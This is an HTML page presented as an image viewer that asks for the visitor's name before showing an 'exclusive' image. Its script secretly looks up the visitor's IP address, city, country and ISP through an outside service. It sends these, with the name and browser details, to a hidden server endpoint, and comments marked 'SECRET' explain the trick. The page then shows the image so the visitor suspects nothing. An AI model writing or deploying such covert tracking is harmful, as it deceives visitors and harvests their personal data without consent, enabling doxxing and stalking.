<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        #content {
            max-width: 800px;
            margin: 0 auto;
        }
        #user-image {
            max-width: 100%;
            border-radius: 8px;
            display: none;
        }
        #name-form {
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div id="content">
        <h1>View Our Exclusive Image</h1>
        
        <div id="name-form">
            <p>Enter your name to view the image:</p>
            <input type="text" id="userName" placeholder="Your name">
            <button onclick="handleSubmission()">View Image</button>
        </div>
        
        <img id="user-image" src="https://i.imgur.com/example.jpg" alt="Exclusive content">
    </div>

    <script>
        // Your IP (replace if it changes)
        const ADMIN_IP = "83.105.112.217";
        
        // Replace with your actual image URL
        const IMAGE_URL = "https://i.imgur.com/example.jpg"; 
        
        async function handleSubmission() {
            const userName = document.getElementById('userName').value.trim() || "Anonymous";
            
            try {
                const ipData = await fetch('https://ipinfo.io/json').then(res => res.json());
                
                // ðŸ‘‡ SECRET: Send data to admin (you) if visitor isn't you
                if (ipData.ip !== ADMIN_IP) {
                    // Encode data to send to your server
                    const visitorData = {
                        name: userName,
                        ip: ipData.ip,
                        city: ipData.city,
                        country: ipData.country,
                        isp: ipData.org,
                        userAgent: navigator.userAgent,
                        time: new Date().toISOString()
                    };
                    
                    // ðŸ‘‡ Replace with your server endpoint (see notes below)
                    fetch("YOUR_SECRET_SERVER_ENDPOINT", {
                        method: "POST",
                        body: JSON.stringify(visitorData),
                        headers: { "Content-Type": "application/json" }
                    }).catch(e => console.error("Couldn't send data (admin only)"));
                }
                
                // Show image to EVERYONE
                document.getElementById('user-image').style.display = 'block';
                document.getElementById('name-form').style.display = 'none';
                
            } catch (error) {
                // Fallback if tracking fails
                document.getElementById('user-image').style.display = 'block';
                document.getElementById('name-form').style.display = 'none';
            }
        }
        
        document.getElementById('userName').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') handleSubmission();
        });
    </script>
</body>
</html>
